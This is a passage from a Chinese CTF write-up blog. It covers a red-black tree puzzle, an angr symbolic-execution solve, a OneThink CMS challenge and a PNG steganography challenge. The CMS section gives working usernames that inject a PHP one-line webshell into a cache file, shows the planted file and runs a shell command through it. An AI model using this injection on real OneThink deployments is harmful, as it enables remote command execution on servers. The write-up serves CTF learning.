x.p = y</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">insert_fixup</span><span class="params">(self, z)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> z.p.color <span class="keyword">is</span> RED:</span><br><span class="line">            <span class="keyword">if</span> z.p <span class="keyword">is</span> z.p.p.left:</span><br><span class="line">                y = z.p.p.right</span><br><span class="line">                <span class="keyword">if</span> y.color <span class="keyword">is</span> RED:</span><br><span class="line">                    z.p.color = BLACK</span><br><span class="line">                    y.color = BLACK</span><br><span class="line">                    z.p.p.color = RED</span><br><span class="line">                    z = z.p.p</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">if</span> z <span class="keyword">is</span> z.p.right:</span><br><span class="line">                        z = z.p</span><br><span class="line">                        self.left_rotate(z)</span><br><span class="line">                    z.p.color = BLACK</span><br><span class="line">                    z.p.p.color = RED</span><br><span class="line">                    self.right_rotate(z.p.p)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                y = z.p.p.left</span><br><span class="line">                <span class="keyword">if</span> y.color <span class="keyword">is</span> RED:</span><br><span class="line">                    z.p.color = BLACK</span><br><span class="line">                    y.color = BLACK</span><br><span class="line">                    z.p.p.color = RED</span><br><span class="line">                    z = z.p.p</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">if</span> z <span class="keyword">is</span> z.p.left:</span><br><span class="line">                        z = z.p</span><br><span class="line">                        self.right_rotate(z)</span><br><span class="line">                    z.p.color = BLACK</span><br><span class="line">                    z.p.p.color = RED</span><br><span class="line">                    self.left_rotate(z.p.p)</span><br><span class="line">        self.root.color = BLACK</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">delete_fixup</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> (x <span class="keyword">is</span> <span class="keyword">not</span> self.root) <span class="keyword">and</span> (x.color <span class="keyword">is</span> BLACK):</span><br><span class="line">            <span class="keyword">if</span> x <span class="keyword">is</span> x.p.left:</span><br><span class="line">                w = x.p.right</span><br><span class="line">                <span class="keyword">if</span> w.color <span class="keyword">is</span> RED:</span><br><span class="line">                    w.color = BLACK</span><br><span class="line">                    x.p.color = RED</span><br><span class="line">                    self.left_rotate(x.p)</span><br><span class="line">                    w = x.p.right</span><br><span class="line">                <span class="keyword">if</span> (w.left.color <span class="keyword">is</span> BLACK) <span class="keyword">and</span> (w.right.color <span class="keyword">is</span> BLACK):</span><br><span class="line">                    w.color = RED</span><br><span class="line">                    x = x.p</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">if</span> w.right.color <span class="keyword">is</span> BLACK:</span><br><span class="line">                        w.left.color = BLACK</span><br><span class="line">                        w.color = RED</span><br><span class="line">                        self.right_rotate(w)</span><br><span class="line">                        w = x.p.right</span><br><span class="line">                    w.color = x.p.color</span><br><span class="line">                    x.p.color = BLACK</span><br><span class="line">                    w.right.color = BLACK</span><br><span class="line">                    self.left_rotate(x.p)</span><br><span class="line">                    x = self.root</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                w = x.p.left</span><br><span class="line">                <span class="keyword">if</span> w.color <span class="keyword">is</span> RED:</span><br><span class="line">                    w.color = BLACK</span><br><span class="line">                    x.p.color = RED</span><br><span class="line">                    self.right_rotate(x.p)</span><br><span class="line">                    w = x.p.left</span><br><span class="line">                <span class="keyword">if</span> (w.right.color <span class="keyword">is</span> BLACK) <span class="keyword">and</span> (w.left.color <span class="keyword">is</span> BLACK):</span><br><span class="line">                    w.color = RED</span><br><span class="line">                    x = x.p</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">if</span> w.left.color <span class="keyword">is</span> BLACK:</span><br><span class="line">                        w.right.color = BLACK</span><br><span class="line">                        w.color = RED</span><br><span class="line">                        self.left_rotate(w)</span><br><span class="line">                        w = x.p.left</span><br><span class="line">                    w.color = x.p.color</span><br><span class="line">                    x.p.color = BLACK</span><br><span class="line">                    w.left.color = BLACK</span><br><span class="line">                    self.right_rotate(x.p)</span><br><span class="line">                    x = self.root</span><br><span class="line">        x.color = BLACK</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">transplant</span><span class="params">(self, u, v)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> u.p <span class="keyword">is</span> self.nil:</span><br><span class="line">            self.root = v</span><br><span class="line">        <span class="keyword">elif</span> u <span class="keyword">is</span> u.p.left:</span><br><span class="line">            u.p.left = v</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            u.p.right = v</span><br><span class="line">        v.p = u.p</span><br></pre></td></tr></table></figure><p>这段红黑树的果子为rbnode对象，整个树根据果子的key构建，果子的value可以可以放我们字符串的字符。<br>默认的红黑树时通过不断加入节点自动生成的，但是加入果子的顺序不同会造成树以及果子的颜色的不同，可以看到我对标准的红黑树构造函数做了修改，这样我们可以根据给出的图片（1.jpg）构造一个红黑树。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"><span class="comment">#提示2，果子的value</span></span><br><span class="line">    _str=<span class="string">" ek`~3c:gf017b744/b38fd~abm7g5489e2&#123;lf6z8d16hae`98&#125;b|-21m.e:"</span></span><br><span class="line"></span><br><span class="line">    nodes=[_NONE]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">        nodes.append( rbnode(key=i,value=_str[i]) )</span><br><span class="line">        <span class="comment"># node, color, l,r,p</span></span><br><span class="line">    <span class="comment"># 录入图片红黑树的信息</span></span><br><span class="line">    tree=[</span><br><span class="line">            [<span class="number">1</span>,BLACK,<span class="number">0</span>,<span class="number">2</span>,<span class="number">3</span>],</span><br><span class="line">            [<span class="number">2</span>,RED,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>],</span><br><span class="line">            [<span class="number">3</span>,RED,<span class="number">1</span>,<span class="number">4</span>,<span class="number">6</span>],</span><br><span class="line">            [<span class="number">4</span>,BLACK,<span class="number">0</span>,<span class="number">5</span>,<span class="number">3</span>],</span><br><span class="line">            [<span class="number">5</span>,RED,<span class="number">0</span>,<span class="number">0</span>,<span class="number">4</span>],</span><br><span class="line">            [<span class="number">6</span>,BLACK,<span class="number">3</span>,<span class="number">8</span>,<span class="number">10</span>],</span><br><span class="line">            [<span class="number">7</span>,RED,<span class="number">0</span>,<span class="number">0</span>,<span class="number">8</span>],</span><br><span class="line">            [<span class="number">8</span>,BLACK,<span class="number">7</span>,<span class="number">9</span>,<span class="number">6</span>],</span><br><span class="line">            [<span class="number">9</span>,RED,<span class="number">0</span>,<span class="number">0</span>,<span class="number">8</span>],</span><br><span class="line">            [<span class="number">10</span>,RED,<span class="number">6</span>,<span class="number">18</span>,<span class="number">23</span>],</span><br><span class="line">            [<span class="number">11</span>,RED,<span class="number">0</span>,<span class="number">0</span>,<span class="number">12</span>],</span><br><span class="line">            [<span class="number">12</span>,BLACK,<span class="number">11</span>,<span class="number">13</span>,<span class="number">14</span>],</span><br><span class="line">            [<span class="number">13</span>,RED,<span class="number">0</span>,<span class="number">0</span>,<span class="number">12</span>],</span><br><span class="line">            [<span class="number">14</span>,RED,<span class="number">12</span>,<span class="number">16</span>,<span class="number">18</span>],</span><br><span class="line">            [<span class="number">15</span>,RED,<span class="number">0</span>,<span class="number">0</span>,<span class="number">16</span>],</span><br><span class="line">            [<span class="number">16</span>,BLACK,<span class="number">15</span>,<span class="number">17</span>,<span class="number">14</span>],</span><br><span class="line">            [<span class="number">17</span>,RED,<span class="number">0</span>,<span class="number">0</span>,<span class="number">16</span>],</span><br><span class="line">            [<span class="number">18</span>,BLACK,<span class="number">14</span>,<span class="number">20</span>,<span class="number">10</span>],</span><br><span class="line">            [<span class="number">19</span>,BLACK,<span class="number">0</span>,<span class="number">0</span>,<span class="number">20</span>],</span><br><span class="line">            [<span class="number">20</span>,RED,<span class="number">19</span>,<span class="number">21</span>,<span class="number">18</span>],</span><br><span class="line">            [<span class="number">21</span>,BLACK,<span class="number">0</span>,<span class="number">22</span>,<span class="number">20</span>],</span><br><span class="line">            [<span class="number">22</span>,RED,<span class="number">0</span>,<span class="number">0</span>,<span class="number">21</span>],</span><br><span class="line">            [<span class="number">23</span>,BLACK,<span class="number">10</span>,<span class="number">26</span>,<span class="number">28</span>],</span><br><span class="line">            [<span class="number">24</span>,RED,<span class="number">0</span>,<span class="number">0</span>,<span class="number">25</span>],</span><br><span class="line">            [<span class="number">25</span>,BLACK,<span class="number">24</span>,<span class="number">0</span>,<span class="number">26</span>],</span><br><span class="line">            [<span class="number">26</span>,BLACK,<span class="number">25</span>,<span class="number">27</span>,<span class="number">23</span>],</span><br><span class="line">            [<span class="number">27</span>,BLACK,<span class="number">0</span>,<span class="number">0</span>,<span class="number">26</span>],</span><br><span class="line">            [<span class="number">28</span>,BLACK,<span class="number">23</span>,<span class="number">43</span>,<span class="number">0</span>],</span><br><span class="line">            [<span class="number">29</span>,RED,<span class="number">0</span>,<span class="number">0</span>,<span class="number">30</span>],</span><br><span class="line">            [<span class="number">30</span>,BLACK,<span class="number">29</span>,<span class="number">31</span>,<span class="number">32</span>],</span><br><span class="line">            [<span class="number">31</span>,RED,<span class="number">0</span>,<span class="number">0</span>,<span class="number">30</span>],</span><br><span class="line">            [<span class="number">32</span>,BLACK,<span class="number">30</span>,<span class="number">34</span>,<span class="number">35</span>],</span><br><span class="line">            [<span class="number">33</span>,RED,<span class="number">0</span>,<span class="number">0</span>,<span class="number">34</span>],</span><br><span class="line">            [<span class="number">34</span>,BLACK,<span class="number">33</span>,<span class="number">0</span>,<span class="number">32</span>],</span><br><span class="line">            [<span class="number">35</span>,RED,<span class="number">32</span>,<span class="number">37</span>,<span class="number">43</span>],</span><br><span class="line">            [<span class="number">36</span>,BLACK,<span class="number">0</span>,<span class="number">0</span>,<span class="number">37</span>],</span><br><span class="line">            [<span class="number">37</span>,BLACK,<span class="number">36</span>,<span class="number">40</span>,<span class="number">35</span>],</span><br><span class="line">            [<span class="number">38</span>,BLACK,<span class="number">0</span>,<span class="number">39</span>,<span class="number">40</span>],</span><br><span class="line">            [<span class="number">39</span>,RED,<span class="number">0</span>,<span class="number">0</span>,<span class="number">38</span>],</span><br><span class="line">            [<span class="number">40</span>,RED,<span class="number">38</span>,<span class="number">41</span>,<span class="number">37</span>],</span><br><span class="line">            [<span class="number">41</span>,BLACK,<span class="number">0</span>,<span class="number">42</span>,<span class="number">40</span>],</span><br><span class="line">            [<span class="number">42</span>,RED,<span class="number">0</span>,<span class="number">0</span>,<span class="number">41</span>],</span><br><span class="line">            [<span class="number">43</span>,BLACK,<span class="number">35</span>,<span class="number">53</span>,<span class="number">28</span>],</span><br><span class="line">            [<span class="number">44</span>,BLACK,<span class="number">0</span>,<span class="number">0</span>,<span class="number">45</span>],</span><br><span class="line">            [<span class="number">45</span>,RED,<span class="number">44</span>,<span class="number">46</span>,<span class="number">48</span>],</span><br><span class="line">            [<span class="number">46</span>,BLACK,<span class="number">0</span>,<span class="number">47</span>,<span class="number">45</span>],</span><br><span class="line">            [<span class="number">47</span>,RED,<span class="number">0</span>,<span class="number">0</span>,<span class="number">46</span>],</span><br><span class="line">            [<span class="number">48</span>,BLACK,<span class="number">45</span>,<span class="number">50</span>,<span class="number">53</span>],</span><br><span class="line">            [<span class="number">49</span>,BLACK,<span class="number">0</span>,<span class="number">0</span>,<span class="number">50</span>],</span><br><span class="line">            [<span class="number">50</span>,RED,<span class="number">49</span>,<span class="number">51</span>,<span class="number">48</span>],</span><br><span class="line">            [<span class="number">51</span>,BLACK,<span class="number">0</span>,<span class="number">52</span>,<span class="number">50</span>],</span><br><span class="line">            [<span class="number">52</span>,RED,<span class="number">0</span>,<span class="number">0</span>,<span class="number">51</span>],</span><br><span class="line">            [<span class="number">53</span>,RED,<span class="number">48</span>,<span class="number">57</span>,<span class="number">43</span>],</span><br><span class="line">            [<span class="number">54</span>,RED,<span class="number">0</span>,<span class="number">0</span>,<span class="number">55</span>],</span><br><span class="line">            [<span class="number">55</span>,BLACK,<span class="number">54</span>,<span class="number">56</span>,<span class="number">57</span>],</span><br><span class="line">            [<span class="number">56</span>,RED,<span class="number">0</span>,<span class="number">0</span>,<span class="number">55</span>],</span><br><span class="line">            [<span class="number">57</span>,BLACK,<span class="number">55</span>,<span class="number">59</span>,<span class="number">53</span>],</span><br><span class="line">            [<span class="number">58</span>,RED,<span class="number">0</span>,<span class="number">0</span>,<span class="number">59</span>],</span><br><span class="line">            [<span class="number">59</span>,BLACK,<span class="number">58</span>,<span class="number">0</span>,<span class="number">57</span>],</span><br><span class="line">            ]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(tree)):</span><br><span class="line">        nodes[tree[i][<span class="number">0</span>]].color=tree[i][<span class="number">1</span>]</span><br><span class="line">        nodes[tree[i][<span class="number">0</span>]].left=nodes[tree[i][<span class="number">2</span>]]</span><br><span class="line">        nodes[tree[i][<span class="number">0</span>]].right=nodes[tree[i][<span class="number">3</span>]]</span><br><span class="line">        nodes[tree[i][<span class="number">0</span>]].p=nodes[tree[i][<span class="number">4</span>]]</span><br><span class="line">    <span class="comment"># 打印二叉树</span></span><br><span class="line">    tr=rbtree(nodes=nodes)</span><br><span class="line">    print(tr)</span><br></pre></td></tr></table></figure><p><strong>备注：</strong></p><p>这真的是一个红黑树的一个很好的实现，还可以可视化的打印整棵树，这里给出正常的构造树的方法，只需给出果子的key和value：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    tr=rbtree(data=&#123;<span class="string">'1'</span>:<span class="string">'1'</span>,<span class="string">'2'</span>:<span class="string">'2'</span>&#125;.items())</span><br><span class="line">    print(tr)</span><br></pre></td></tr></table></figure><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>根据提示3，从树上取走第 18,35,53,50,14,28,19,6,54,36 个果子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">18</span>,<span class="number">35</span>,<span class="number">53</span>,<span class="number">50</span>,<span class="number">14</span>,<span class="number">28</span>,<span class="number">19</span>,<span class="number">6</span>,<span class="number">54</span>,<span class="number">36</span>]:</span><br><span class="line">    tr.delete(tr.force_search(i))</span><br></pre></td></tr></table></figure><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>根据提示4和5，获取第[8,56,47,37,52,34,17,8,8,29,7,47,40,57,46,24,34,34,57,29,22,5,16,57,24,29,8,12,57,12,12,21,33,34,55,51,22,45,34,31,1,23]果子的值，并且按照颜色对其ascii+1或-1，即可得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">8</span>,<span class="number">56</span>,<span class="number">47</span>,<span class="number">37</span>,<span class="number">52</span>,<span class="number">34</span>,<span class="number">17</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">29</span>,<span class="number">7</span>,<span class="number">47</span>,<span class="number">40</span>,<span class="number">57</span>,<span class="number">46</span>,<span class="number">24</span>,<span class="number">34</span>,<span class="number">34</span>,<span class="number">57</span>,<span class="number">29</span>,<span class="number">22</span>,<span class="number">5</span>,<span class="number">16</span>,<span class="number">57</span>,<span class="number">24</span>,<span class="number">29</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">57</span>,<span class="number">12</span>,<span class="number">12</span>,<span class="number">21</span>,<span class="number">33</span>,<span class="number">34</span>,<span class="number">55</span>,<span class="number">51</span>,<span class="number">22</span>,<span class="number">45</span>,<span class="number">34</span>,<span class="number">31</span>,<span class="number">1</span>,<span class="number">23</span>]:</span><br><span class="line">    node=tr.force_search(i)</span><br><span class="line">    <span class="keyword">if</span> node.color==BLACK:</span><br><span class="line">        s+=chr(ord(node.value)<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s+=chr(ord(node.value)+<span class="number">1</span>)</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure><p>算出flag为：<br>flag{10ff49a7-db11-4e43-b4f6-66ef12ceb19d}</p><h1 id="martricks"><a href="#martricks" class="headerlink" title="martricks"></a>martricks</h1><p>刚拿到这题就感觉跟符号执行有关系，可惜没有贯彻思想继续做下去，不过解法蛮简单的，这里简单记录一下，也是当学习一下angr吧：</p><h2 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h2><p>拿到题目ida打开，大概F5看一下，有一个判断，如果等于0就congrats否则wrong，那么记下这两处字符串的地址。</p><p><img src="/ctf-2018网鼎杯二叉树-martrickswp/1535025943800.png" alt="1535025943800"></p><h2 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h2><p>接下来就可以用angr调用该文件，根据符号执行让我们执行到400A84地址，其中避免经过400A90地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">angr_example</span><span class="params">()</span>:</span></span><br><span class="line">    p = angr.Project(<span class="string">"./martricks"</span>)</span><br><span class="line">    simgr = p.factory.simulation_manager(p.factory.full_init_state())</span><br><span class="line">    simgr.explore(find=<span class="number">0x400A84</span>, avoid=<span class="number">0x400A90</span>)  <span class="comment"># 成功路径，失败路径</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>).strip(<span class="string">'\0\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">print</span> angr_example()</span><br></pre></td></tr></table></figure><p>等待一会后得到flag：</p><p>flag{Everyth1n_th4t_kill5_m3_m4kes_m3_fee1_aliv3}</p><p><strong>注：</strong> 所有程序题目已经上传至GitHub：<a href="https://github.com/Anemone95/ctf_wp/tree/master/wangding2018" target="_blank" rel="noopener">https://github.com/Anemone95/ctf_wp/tree/master/wangding2018</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 二叉树 </tag>
            
            <tag> 符号执行 </tag>
            
            <tag> angr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>i春秋 “巅峰极客” CTF A Simple CMS&amp;loli WP</title>
      <link href="/ctf-i%E6%98%A5%E7%A7%8B%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2CTF-A-Simple-CMS-loli-WP/"/>
      <url>/ctf-i%E6%98%A5%E7%A7%8B%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2CTF-A-Simple-CMS-loli-WP/</url>
      
        <content type="html"><![CDATA[<h1 id="A-Simple-CMS"><a href="#A-Simple-CMS" class="headerlink" title="A Simple CMS"></a>A Simple CMS</h1><p>看到网站是OneThink做的，百度搜了下该CMS存在<a href="https://www.secpulse.com/archives/55862.html" target="_blank" rel="noopener">漏洞</a>，参考文章过程即可得到flag。但是其中的缓存文件做了修改，需要在本地复现一下，确定缓存文件名。</p><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>扫描网站敏感目录，发现<code>www.zip</code>文件：</p><p><img src="/ctf-i春秋巅峰极客CTF-A-Simple-CMS-loli-WP/www.zip.png" alt="www.zip"></p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>下载文件，在本地构建复现环境，首先删除<code>onethink/onethink/Application/Install/Data/install.lock</code>文件，然后访问<code>install.php</code>。</p><a id="more"></a><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>依次使用<code>%0a$a=$_GET[a];//</code> 和 <code>%0aecho &#96;$a&#96;;//</code> 注册账号，在依次登录账号，发现存在<code>Runtime/Temp/onethink_d403acece4ebce56a3a4237340fbbe70.php</code>文件，且文件内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//000000000000a:4:&#123;s:2:"u1";s:13:"Administrator";s:2:"u3";s:6:"test12";s:2:"u4";s:15:"</span></span><br><span class="line">$a=$_GET[a];<span class="comment">//";s:2:"u5";s:13:"</span></span><br><span class="line"><span class="keyword">echo</span> `$a`;<span class="comment">//";&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>说明我们的一句话上传成功，文件名为<code>Runtime/Temp/onethink_d403acece4ebce56a3a4237340fbbe70.php</code>，该文件名不改变。</p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>在服务器上重复步骤2，getshell</p><p><img src="/ctf-i春秋巅峰极客CTF-A-Simple-CMS-loli-WP/getshell.png" alt="getshell"></p><p>在tmp目录下获取flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ddd27aa160354000ba7eba4b621e08cd9274bde410054da1.game.ichunqiu.com/Runtime/Temp/onethink_d403acece4ebce56a3a4237340fbbe70.php?a=cat%20/tmp/flag</span><br></pre></td></tr></table></figure></p><h1 id="loli"><a href="#loli" class="headerlink" title="loli"></a>loli</h1><h2 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h2><p>图片下载下来，根据题目hint（0xFF），想到使用0xFF异或整个文件，脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'./1.png'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f, open(<span class="string">'xor.png'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> wf:</span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> f.read():</span><br><span class="line">            wf.write(chr(ord(each) ^ <span class="number">0xff</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    xor()</span><br></pre></td></tr></table></figure></p><p>得到文件<code>xor.png</code>。</p><h2 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h2><p>使用二进制编辑器观察<code>xor.png</code>尾部，看到提示“black and white”，以及“IEND”标识，这是png的文件尾部，暗示该文件中隐藏了一个png文件。</p><p><img src="/ctf-i春秋巅峰极客CTF-A-Simple-CMS-loli-WP/end.png" alt="end"></p><p>使用 foremost 命令直接提取 （binwalk没卵用，感谢NaN师傅的提示Orz）：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foremost xor.png</span><br><span class="line">ls ./output/png|grep png</span><br><span class="line">00006777.png</span><br></pre></td></tr></table></figure></p><h2 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h2><p>观察png文件，可以看到色块分为11列，每列隔行的色块永远是黑色，这说明应该横向读取图片，而列中的横长条由8个小色块组成，显然其代表的是一个字节的数据。</p><p><img src="/ctf-i春秋巅峰极客CTF-A-Simple-CMS-loli-WP/out.png" alt="out"></p><p>按上述思路提取该信息：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.image <span class="keyword">as</span> mpimg  <span class="comment"># mpimg 用于读取图片5:18</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># png[y][x][rgb]</span></span><br><span class="line"></span><br><span class="line">res_str = []</span><br><span class="line">res = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readpng</span><span class="params">()</span>:</span></span><br><span class="line">    png = mpimg.imread(<span class="string">'./out.png'</span>)</span><br><span class="line">    yy, xx, depth = png.shape</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(yy):</span><br><span class="line">        <span class="keyword">if</span> y % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, xx - <span class="number">1</span>, <span class="number">9</span>):</span><br><span class="line">                _str = <span class="string">"0b"</span> + str(int(png[y][x][<span class="number">0</span>])) + str(int(png[y][x + <span class="number">1</span>][<span class="number">0</span>])) + str(int(png[y][x + <span class="number">2</span>][<span class="number">0</span>])) + str(int(png[y][x + <span class="number">3</span>][<span class="number">0</span>])) + str(int(png[y][x + <span class="number">4</span>][<span class="number">0</span>])) + str(int(png[y][x + <span class="number">5</span>][<span class="number">0</span>])) + str(int(png[y][x + <span class="number">6</span>][<span class="number">0</span>])) + str(int(png[y][x + <span class="number">7</span>][<span class="number">0</span>]))</span><br><span class="line">                res_str.append(_str)</span><br><span class="line">                res.append(bin2hex(_str))</span><br><span class="line">    <span class="keyword">print</span> res_str</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'res.bin'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> res:</span><br><span class="line">            f.write(chr(each))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin2hex</span><span class="params">(_bin=<span class="string">"0b101"</span>)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> int(_bin, <span class="number">2</span>) ^ <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    readpng()</span><br><span class="line">    <span class="comment">#  